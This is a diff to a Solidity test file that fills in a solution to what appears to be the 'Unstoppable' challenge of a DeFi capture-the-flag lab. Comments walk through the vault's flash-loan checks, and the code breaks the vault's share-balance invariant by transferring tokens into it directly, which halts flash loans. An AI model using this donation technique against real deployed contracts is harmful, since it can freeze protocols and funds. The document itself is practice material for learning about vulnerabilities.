@@ -91,7 +91,24 @@ contract UnstoppableChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_unstoppable() public checkSolvedByPlayer {}
+    function test_unstoppable() public checkSolvedByPlayer {
+        // ********************
+        // 1. Checked the _isSolved() hook, we have 2 things to accomplish - a. transfer ownership of vault from monitor
+        // contract to deployer, b. Vault needs to be paused
+        // 2. We need to make sure that when minitor contract calls this: function checkFlashLoan(uint256 amount), it will pause the vault.
+        // 3. We need vault.flashLoan(this, asset, amount, bytes("")) to fail
+        // 4. Few conditions for it to fail:
+        // // - Invalid Amount
+        // // - Invalid Asset
+        // // - if (convertToShares(totalSupply) != balanceBefore) => This part is fishy
+        // // - safeTransfer() fails
+        // // - callback onFlashLoan() fails
+        // 5. LOL Transferred 10 tokens to the vault and it halts
+        // 6. Because the flash loan fee was transferred to beneficiary, to the tokens expects the vault amount to not change
+        // ********************
+
+        token.transfer(address(vault), 10e18);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
